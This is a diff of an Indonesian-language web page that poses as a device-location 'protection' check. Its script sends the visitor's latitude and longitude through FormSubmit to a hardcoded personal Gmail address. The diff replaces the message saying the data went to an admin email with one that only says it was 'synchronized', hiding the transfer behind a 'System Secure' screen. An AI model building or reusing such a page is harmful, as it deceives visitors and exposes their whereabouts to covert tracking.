@@ -99,18 +99,30 @@
             font-weight: 300;
         }
 
-        .success-icon {
-            display: none;
-            color: #10b981;
-            font-size: 4rem;
-            margin-bottom: 1.5rem;
+        .status-ready { color: #10b981; font-weight: 600; margin-top: 1rem; }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-out forwards;
         }
 
-        .status-ready { color: #10b981; font-weight: 600; margin-top: 1rem; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-image {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 1.5rem;
+            margin-top: 1.5rem;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border: 2px solid rgba(255,255,255,0.1);
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Keadaan Mendeteksi -->
         <div id="status-ui">
             <div class="scanner-container">
                 <div class="scanner">
@@ -121,16 +133,20 @@
             <p id="msg">Sedang memverifikasi lokasi perangkat...</p>
         </div>
         
-        <div id="success-ui" style="display: none;">
-            <div style="font-size: 5rem; margin-bottom: 1rem ;">✅</div>
+        <!-- Keadaan Berhasil -->
+        <div id="success-ui" style="display: none;" class="fade-in">
+            <div style="font-size: 4rem; margin-bottom: 0.5rem ;">✅</div>
             <h1>Proteksi Aktif</h1>
-            <p>Data lokasi telah berhasil dikirim ke email admin.</p>
+            <p>Data lokasi telah berhasil disinkronkan.</p>
+            
+            <!-- GAMBAR YANG ANDA MINTA -->
+            <img src="WhatsApp Image 2025-12-03 at 08.26.35.jpeg" alt="Status Image" class="success-image">
+            
             <div class="status-ready">System Secure</div>
         </div>
     </div>
 
     <script>
-        // MASUKKAN EMAIL ANDA DI SINI
         const targetEmail = "cholilelgara001@gmail.com";
 
         const titleEl = document.getElementById('title');
@@ -139,8 +155,6 @@
         const successUI = document.getElementById('success-ui');
 
         function sendData(lat, lng) {
-            // Kita menggunakan FormSubmit - JAUH LEBIH MUDAH
-            // Tidak perlu daftar, tidak perlu API Key, tidak perlu login dashboard
             fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
                 method: "POST",
                 headers: { 
@@ -158,12 +172,11 @@
             })
             .then(res => res.json())
             .then(data => {
-                console.log(data);
                 statusUI.style.display = 'none';
                 successUI.style.display = 'block';
             })
             .catch(err => {
-                console.log(err);
+                console.error(err);
                 titleEl.innerText = "Gagal Mengambil Data";
                 msgEl.innerText = "Terjadi gangguan saat sinkronisasi.";
             });
